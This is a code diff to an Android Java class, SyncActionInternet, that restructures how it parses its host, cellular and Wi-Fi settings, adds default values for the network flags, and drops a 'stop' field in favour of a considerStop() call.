@@ -22,7 +22,6 @@ import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class SyncActionInternet.
  */
@@ -42,8 +41,6 @@ public class SyncActionInternet extends SyncAction {
 	/** The host. */
 	String host;
 
-	private boolean stop;
-
 	/**
 	 * Instantiates a new sync action internet.
 	 * 
@@ -61,31 +58,45 @@ public class SyncActionInternet extends SyncAction {
 	 */
 	@Override
 	protected boolean parse(final ConfAction params) {
-
 		try {
-			gprs = params.getBoolean("cell");
-			wifi = params.getBoolean("wifi");
-			wifiForced = wifi;
 			host = params.getString("host");
-			stop = params.getBoolean("stop");
-
 		} catch (final ConfigurationException e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED"); //$NON-NLS-1$
+				Check.log(TAG + " Error: params FAILED, host is missing"); //$NON-NLS-1$
 			}
 
 			return false;
 		}
 
+		try {
+			gprs = params.getBoolean("cell");
+			wifi = params.getBoolean("wifi");
+			wifiForced = wifi;
+			
+			
+		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params using default values"); //$NON-NLS-1$
+			}
+
+			gprs = false;
+			wifi = true;
+			wifiForced = wifi;
+		}
+		
 		if (Cfg.DEBUG) {
 			final StringBuffer sb = new StringBuffer();
 			sb.append("gprs: " + gprs); //$NON-NLS-1$
 			sb.append(" wifi: " + wifi); //$NON-NLS-1$
-			sb.append(" stop: " + stop); //$NON-NLS-1$
+			sb.append(" stop: " + considerStop()); //$NON-NLS-1$
 			sb.append(" host: " + host); //$NON-NLS-1$
 			Check.log(TAG + sb.toString());//$NON-NLS-1$
 		}
